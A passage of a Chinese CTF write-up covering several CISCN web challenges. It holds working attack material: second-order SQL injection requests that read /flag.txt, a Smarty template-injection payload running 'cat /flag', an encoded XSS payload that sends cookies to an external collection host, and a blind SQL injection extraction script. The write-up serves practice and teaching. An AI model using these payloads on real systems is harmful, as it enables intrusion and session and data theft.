class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;确认订单&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class=\"line\">&lt;meta charset&#x3D;&quot;utf-8&quot;&#x2F;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class=\"line\">\t&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">        &lt;img class&#x3D;&quot;logo&quot; src&#x3D;&quot;.&#x2F;assets&#x2F;img&#x2F;logo-zh.png&quot;&gt;</span><br><span class=\"line\">        &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class=\"line\">                &lt;?php global $msg; echo &#39;&lt;h2 class&#x3D;&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;&#x2F;h2&gt;&#39;;?&gt;</span><br><span class=\"line\">                &lt;a href&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;&#x2F;button&gt;</span><br><span class=\"line\">                &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;&#x2F;div&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class=\"line\">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class=\"line\">\t\t&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class=\"line\">            &lt;p style&#x3D;&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class=\"line\">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">\t\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">\t&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;retina-1.1.0.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.unveilEffects.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>在confirm.php、delete.php、search.php和change.phpz中存在报错注入的可能，username和phone过滤非常严格，但是address没怎么过滤，所以考虑这个参数。</p>\n<p>因为在confirm.php中在存入的过程中使用了bind_param函数，所以无法绕过。在change.php将之前存入的地址拿来出来，存在二次注入。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/confirm.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 105</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">user_name=1&amp;phone=1&amp;address=1'  where user_id=(updatexml(0,concat(0,(select load_file('/flag.txt'))),0))#</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/change.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 29</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">user_name=1&amp;phone=1&amp;address=1</span><br></pre></td></tr></table></figure>\n\n<p>回显数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">errorXPATH syntax error: &#39;flag&#123;e9485017-ebf4-4ea4-8579-daa&#39;</span><br></pre></td></tr></table></figure>\n\n<p>显示不全，再逆向输出一下</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/confirm.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 114</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">user_name=1&amp;phone=1&amp;address=1'  where user_id=(updatexml(0,concat(0,(select reverse(load_file('/flag.txt')))),0))#</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/change.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 29</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"></span><br><span class=\"line\">user_name=1&amp;phone=1&amp;address=1</span><br></pre></td></tr></table></figure>\n\n<p>输出内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">errorXPATH syntax error: &#39;</span><br><span class=\"line\">&#125;6e91d8479aad-9758-4ae4-4fbe-71&#39;</span><br></pre></td></tr></table></figure>\n\n<p>拼接即可</p>\n<h2 id=\"华东南赛区-Web11\"><a href=\"#华东南赛区-Web11\" class=\"headerlink\" title=\"华东南赛区 Web11\"></a>华东南赛区 Web11</h2><p><a href=\"https://zhuanlan.zhihu.com/p/28823933\" target=\"_blank\" rel=\"noopener\">关于SSTI</a></p>\n<p>打开题目，页面说提供了查询公网IP的api,右上角还有显示IP，于是在头部加入X-Forwarded-For</p>\n<p><img src=\"/pic/94.png\" alt=\"\"></p>\n<p>可能存在SSTI，测试一下的确存在SSTI</p>\n<p><img src=\"/pic/96.png\" alt=\"\"></p>\n<p>在网页的最下方发现了<strong>Build With Smarty</strong> </p>\n<p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 3.1.30</p>\n<p><img src=\"/pic/97.png\" alt=\"\"></p>\n<p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但是Smarty3.0手册说已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。发现报错了</p>\n<p><img src=\"/pic/98.png\" alt=\"\"></p>\n<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>\n<p>那么对于php5的环境我们就可以使用，服务器是7.0+无法使用js标签</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>有一个<a href=\"https://www.smarty.net/docs/zh_CN/language.function.if.tpl\" target=\"_blank\" rel=\"noopener\">{if}标签</a>可以使用</p>\n<p>marty的<code>{if}</code>条件判断和PHP的<a href=\"http://php.net/if\" target=\"_blank\" rel=\"noopener\">if</a> 非常相似，只是增加了一些特性。 每个<code>{if}</code>必须有一个配对的<code>{/if}</code>. 也可以使用<code>{else}</code> 和 <code>{elseif}</code>. 全部的PHP条件表达式和函数都可以在if内使用，如<em>||</em>, <em>or</em>, <em>&amp;&amp;</em>, <em>and</em>, <em>is_array()</em>, 等等.</p>\n<p>将X-Forwarded-For头改为{if phpinfo()}{/if}可以查看phpinfo</p>\n<p><img src=\"/pic/99.png\" alt=\"\"></p>\n<p>{if system(‘cat /flag’)}{/if}即可获取到flag</p>\n<p><a href=\"https://www.jianshu.com/p/eb8d0137a7d3\" target=\"_blank\" rel=\"noopener\">参考链接</a></p>\n<h2 id=\"华东北赛区-Web2\"><a href=\"#华东北赛区-Web2\" class=\"headerlink\" title=\"华东北赛区 Web2\"></a>华东北赛区 Web2</h2><p>使用御剑扫描发现login.php，admin.php</p>\n<p><img src=\"/pic/100.png\" alt=\"\"></p>\n<p>访问admin.php，发现要admin才访问，去login.php注册一个账号，然后登入，有一个投稿</p>\n<p><img src=\"/pic/101.png\" alt=\"\"></p>\n<p>明显的提示这题是XSS</p>\n<p>提交数据之后，“=” 被替换成了“等于号”，src,//被替换成waf，单引号、括号、双引号会被替换成中文的。</p>\n<p>来自赵师傅的payload     svg标签 ：xml自动解析html实体编码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">in_str = <span class=\"string\">\"(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=dzWPkK&amp;keepsession=0&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return''&#125;&#125;)());&#125;)();\"</span></span><br><span class=\"line\">output = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> c in in_str:</span><br><span class=\"line\">    output += <span class=\"string\">\"&amp;#\"</span> + str(ord(c))</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">\"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34\"</span> + output + <span class=\"string\">\"&amp;#34&amp;#41&lt;/script&gt;\"</span>)</span><br></pre></td></tr></table></figure>\n\n<p>得到地址后去commitbug.php（反馈）页面提交url</p>\n<p><img src=\"/pic/102.png\" alt=\"\"></p>\n<p>url中要将*.buuoj.cn改成web</p>\n<p>附上碰撞的脚本，发现使用python编写会出错（字符与MD5对应不上）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span>($a=<span class=\"number\">0</span>;substr(md5($a),<span class=\"number\">0</span>,<span class=\"number\">6</span>)!=<span class=\"string\">'2ccf73'</span>;$a++)&#123;&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> md5($a);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urldecode(<span class=\"string\">'%09'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a;</span><br><span class=\"line\"> <span class=\"comment\">//2ccf731c402b81796327fb7a4c5cd943\t225315</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>去xss平台收cookie</p>\n<p><img src=\"/pic/103.png\" alt=\"\"></p>\n<p>修改cookie为收到的cookie，访问admin.php   存在sql注入</p>\n<p><img src=\"/pic/104.png\" alt=\"\">)<img src=\"/pic/105.png\" alt=\"\"></p>\n<p>编写注入脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 2/19/2020 12:34 AM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2hex</span><span class=\"params\">(strs)</span>:</span></span><br><span class=\"line\">    hexs=<span class=\"string\">'0x'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(len(strs)):</span><br><span class=\"line\">        hexs+=hex(ord(strs[x]))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    print(hexs)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hexs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://da74811e-0cb8-498a-a1c7-362929c21b2d.node3.buuoj.cn/admin.php?id=0^('</span>+payload+<span class=\"string\">')'</span></span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\">    html = requests.get(url,cookies=&#123;<span class=\"string\">'PHPSESSID'</span>:<span class=\"string\">'e7f4c1e48fd638f2a517cbe6d0a81857'</span>&#125;)</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\"></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print(html,'*-*-*-*-*-*', mid)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'不能查询管理员哦'</span>  <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tables</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    db=str2hex(db)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(information_schema.tables)where(table_schema='</span>+db+<span class=\"string\">')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    table = str2hex(table)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database() #ciscn</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tables('ciscn') #flag,users</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_columns('flag') #flagg</span></span><br><span class=\"line\"></span><br><span class=\"line\">get_data(<span class=\"string\">'flagg'</span>,<span class=\"string\">'flag'</span>) <span class=\"comment\">#flag&#123;88331b80-7fb8-4f2f-9fa1-a4b85bd8562d&#125;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"华东南赛区-Double-Secret\"><a href=\"#华东南赛区-Double-Secret\" class=\"headerlink\" title=\"华东南赛区 Double Secret\"></a>华东南赛区 Double Secret</h2><p>打卡题目的提示是:<code>Welcome To Find Secret</code></p>\n<p>使用御剑扫一下目录，扫描到robots.txt</p>\n<p>内容是: <code>It is Android ctf</code></p>\n<p>尝试范围/secret  提示<code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>\n<p>传入参数?secret=123456789后报错</p>\n<p><img src=\"/pic/106.png\" alt=\"\"></p>\n<p>发现是flask框架，点开/app/app.py后有如下代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">File <span class=\"string\">\"/app/app.py\"</span>, line <span class=\"number\">35</span>, <span class=\"keyword\">in</span> secret</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(secret==<span class=\"literal\">None</span>):</span><br><span 